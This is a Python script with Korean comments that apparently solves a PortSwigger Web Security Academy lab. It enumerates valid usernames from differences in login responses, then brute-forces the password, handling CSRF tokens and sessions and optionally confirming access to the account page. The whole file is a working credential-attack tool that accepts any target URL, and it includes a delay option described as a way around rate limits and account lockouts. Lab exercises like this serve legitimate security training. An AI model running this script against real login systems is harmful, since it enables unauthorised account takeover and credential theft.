#!/usr/bin/env python3
"""
Authentication - Username Enumeration & Password Brute-Force
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

후보 목록을 "입력값" 으로 받아 다음을 수행한다.
  1) username enumeration  : 로그인 응답 차이로 유효한 username 탐지
  2) password brute-force  : 탐지한 username 의 password 탐색

기본 입력 목록 (--usernames / --passwords 미지정 시 자동 다운로드):
  usernames : https://portswigger.net/web-security/authentication/auth-lab-usernames
  passwords : https://portswigger.net/web-security/authentication/auth-lab-passwords

--usernames / --passwords 는 아래 세 가지를 모두 허용한다.
  - URL            : https://... (해당 페이지에서 목록 추출)
  - 파일 경로      : 한 줄에 하나씩
  - 인라인 목록    : "carlos,root,admin"

사용 예시:
  # 목록 자동 다운로드 후 enumeration + brute-force 전체 수행
  python3 14-authentication-brute-force.py --target "https://LAB-ID.web-security-academy.net"

  # 로컬 파일 사용
  python3 14-authentication-brute-force.py --target "https://LAB-ID.web-security-academy.net" \\
    --usernames auth-usernames.txt --passwords auth-passwords.txt

  # 이미 username 을 아는 경우 password 만
  python3 14-authentication-brute-force.py --target "https://LAB-ID.web-security-academy.net" --user alice --only-brute

  # 로그인 성공 후 계정 페이지 확인까지
  python3 14-authentication-brute-force.py --target "https://LAB-ID.web-security-academy.net" --verify
"""

import argparse
import os
import re
import sys
import html
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_USERNAMES = "https://portswigger.net/web-security/authentication/auth-lab-usernames"
DEFAULT_PASSWORDS = "https://portswigger.net/web-security/authentication/auth-lab-passwords"

TIMEOUT = 15
SUCCESS_CODES = (301, 302, 303, 307, 308)


def parse_wordlist(page_html: str) -> list[str]:
    """PortSwigger 목록 페이지의 <code> 블록에서 한 줄씩 추출한다."""
    for block in re.findall(r"<code[^>]*>(.*?)</code>", page_html, re.S):
        text = html.unescape(re.sub(r"<[^>]+>", "", block)).strip()
        lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
        if len(lines) > 20:
            return lines
    return []


def load_wordlist(source: str | None, default_url: str) -> list[str]:
    """URL / 파일 / 인라인 문자열을 목록으로 읽는다."""
    if source is None:
        source = default_url

    if source.startswith("http://") or source.startswith("https://"):
        print(f"[*] 목록 다운로드: {source}")
        resp = requests.get(source, verify=False, timeout=TIMEOUT)
        resp.raise_for_status()
        items = parse_wordlist(resp.text)
        if not items:
            raise RuntimeError(f"목록을 추출하지 못했습니다: {source}")
        return items

    if os.path.isfile(source):
        with open(source, encoding="utf-8") as f:
            return [ln.strip() for ln in f if ln.strip()]

    return [x.strip() for x in source.split(",") if x.strip()]


class LoginSession:
    """로그인 페이지의 CSRF 토큰과 세션 쿠키를 유지하며 로그인을 시도한다."""

    def __init__(self, target: str, login_path: str, username_field: str,
                 password_field: str, session_cookie: str | None = None):
        self.base = target.rstrip("/")
        self.login_url = self.base + login_path
        self.username_field = username_field
        self.password_field = password_field
        self.s = requests.Session()
        self.s.verify = False
        if session_cookie:
            self.s.cookies.set("session", session_cookie)
        self.csrf = self._fetch_csrf()

    def _fetch_csrf(self) -> str | None:
        resp = self.s.get(self.login_url, timeout=TIMEOUT, allow_redirects=True)
        m = (re.search(r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']', resp.text)
             or re.search(r'value=["\']([^"\']+)["\']\s+name=["\']csrf["\']', resp.text))
        return m.group(1) if m else None

    def attempt(self, username: str, password: str) -> requests.Response:
        data = {self.username_field: username, self.password_field: password}
        if self.csrf:
            data["csrf"] = self.csrf
        return self.s.post(self.login_url, data=data, timeout=TIMEOUT,
                           allow_redirects=False)


def enumerate_username(login: LoginSession, usernames: list[str],
                       fail_text: str, delay: float) -> str | None:
    """응답 차이로 유효한 username 을 찾는다."""
    print(f"\n[*] 1단계 — username enumeration ({len(usernames)}개)")
    print(f"    실패 시그니처: {fail_text!r}")
    print(f"    {'username':<24} {'status':>6} {'length':>8}  결과")
    print("    " + "-" * 56)

    results = []
    for i, user in enumerate(usernames, 1):
        try:
            resp = login.attempt(user, "invalid-password-12345")
        except requests.exceptions.RequestException as e:
            print(f"    {user:<24} 요청 실패: {e}")
            continue

        body = resp.text
        has_fail = fail_text in body
        results.append((user, resp.status_code, len(body), has_fail))

        marker = "" if has_fail else "  <== 유효 의심"
        print(f"    {user:<24} {resp.status_code:>6} {len(body):>8}{marker}")
        if delay:
            time.sleep(delay)

    # 실패 시그니처가 없는(=다른 응답) 후보를 유효 username 으로 판정
    candidates = [r for r in results if not r[3]]
    if not candidates:
        # 시그니처 기반 판별 실패 시 상태코드/길이 이상치로 재시도
        print("\n[!] 실패 시그니처로 구분되지 않음 — 길이/상태코드 이상치를 확인하세요.")
        lengths = sorted({r[2] for r in results})
        print(f"    관측된 length 종류: {lengths}")
        return None

    for user, status, length, _ in candidates:
        print(f"\n[+] 유효 username 후보: {user}  (status={status}, length={length})")
    return candidates[0][0]


def brute_password(login: LoginSession, username: str, passwords: list[str],
                   fail_text: str, delay: float) -> str | None:
    """username 에 대한 password 를 탐색한다."""
    print(f"\n[*] 2단계 — password brute-force (username={username}, {len(passwords)}개)")
    print(f"    실패 시그니처: {fail_text!r}")
    print(f"    성공 기준: status {SUCCESS_CODES} 또는 실패 시그니처 부재")
    print("    " + "-" * 56)

    for i, pw in enumerate(passwords, 1):
        try:
            resp = login.attempt(username, pw)
        except requests.exceptions.RequestException as e:
            print(f"    [{i:>3}] {pw:<20} 요청 실패: {e}")
            continue

        success = resp.status_code in SUCCESS_CODES or fail_text not in resp.text
        if success:
            print(f"    [{i:>3}] {pw:<20} status={resp.status_code}  <== 성공")
            print(f"\n[+] 자격증명 발견: {username} / {pw}")
            return pw

        if i % 10 == 0 or i == len(passwords):
            print(f"    [{i:>3}/{len(passwords)}] 진행 중... (마지막: {pw})")
        if delay:
            time.sleep(delay)

    print("\n[-] 목록 내에서 password 를 찾지 못했습니다.")
    return None


def verify_login(login: LoginSession, username: str, password: str,
                 account_path: str) -> None:
    """탐색한 자격증명으로 로그인해 계정 페이지 접근을 확인한다."""
    print(f"\n[*] 검증 — {username} 로그인 후 {account_path} 접근")
    data = {"username": username, "password": password}
    if login.csrf:
        data["csrf"] = login.csrf
    resp = login.s.post(login.login_url, data=data, timeout=TIMEOUT,
                        allow_redirects=True)
    if "Log out" in resp.text or "log out" in resp.text.lower():
        print("[+] 로그인 성공 (로그아웃 링크 확인)")
    else:
        print(f"[?] 로그인 결과 확인 필요 (status={resp.status_code})")

    acct = login.s.get(login.base + account_path, timeout=TIMEOUT,
                       allow_redirects=True)
    print(f"    GET {account_path} → status={acct.status_code}, length={len(acct.text)}")
    if acct.status_code == 200:
        print("[+] 계정 페이지 접근 확인")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Authentication username enumeration & password brute-force"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--login-path", default="/login",
                        help="로그인 경로 (기본값: /login)")
    parser.add_argument("--username-field", default="username",
                        help="username 파라미터 이름 (기본값: username)")
    parser.add_argument("--password-field", default="password",
                        help="password 파라미터 이름 (기본값: password)")
    parser.add_argument("--usernames", default=None,
                        help=f"username 목록 (URL/파일/인라인). 기본: {DEFAULT_USERNAMES}")
    parser.add_argument("--passwords", default=None,
                        help=f"password 목록 (URL/파일/인라인). 기본: {DEFAULT_PASSWORDS}")
    parser.add_argument("--enum-fail", default="Invalid username",
                        help="username 열거 시 실패 응답에 포함되는 문자열 (기본: 'Invalid username')")
    parser.add_argument("--pass-fail", default="Incorrect password",
                        help="password 탐색 시 실패 응답에 포함되는 문자열 (기본: 'Incorrect password')")
    parser.add_argument("--user", default=None,
                        help="이미 알고 있는 username (지정 시 enumeration 생략)")
    parser.add_argument("--only-enumerate", action="store_true",
                        help="username enumeration 만 수행")
    parser.add_argument("--only-brute", action="store_true",
                        help="password brute-force 만 수행 (--user 필요)")
    parser.add_argument("--session", default=None,
                        help="기존 세션 쿠키 값 (선택)")
    parser.add_argument("--account-path", default="/my-account",
                        help="검증 시 접근할 계정 경로 (기본: /my-account)")
    parser.add_argument("--verify", action="store_true",
                        help="탐색한 자격증명으로 로그인/계정 접근 검증")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="요청 간 지연(초). rate limit/account lock 대응 (기본: 0)")
    args = parser.parse_args()

    # 목록 준비
    try:
        usernames = load_wordlist(args.usernames, DEFAULT_USERNAMES)
        passwords = (load_wordlist(args.passwords, DEFAULT_PASSWORDS)
                     if not args.only_enumerate else [])
    except Exception as e:
        print(f"[-] 목록 로딩 실패: {e}")
        sys.exit(1)

    print(f"[*] 대상      : {args.target}")
    print(f"    username  : {len(usernames)}개")
    if not args.only_enumerate:
        print(f"    password  : {len(passwords)}개")

    login = LoginSession(args.target, args.login_path, args.username_field,
                         args.password_field, args.session)
    if login.csrf:
        print("    CSRF 토큰 : 획득")
    else:
        print("    CSRF 토큰 : 없음 (불필요한 대상일 수 있음)")

    username = args.user

    if not args.only_brute:
        found = enumerate_username(login, usernames, args.enum_fail, args.delay)
        if found:
            username = username or found
        if args.only_enumerate:
            return

    if username is None:
        print("[-] username 을 찾지 못했습니다. --user 로 지정하거나 --enum-fail 을 조정하세요.")
        sys.exit(1)

    password = brute_password(login, username, passwords, args.pass_fail, args.delay)
    if password is None:
        sys.exit(1)

    print(f"\n[=] 결과: {username} / {password}")

    if args.verify:
        verify_login(login, username, password, args.account_path)


if __name__ == "__main__":
    main()
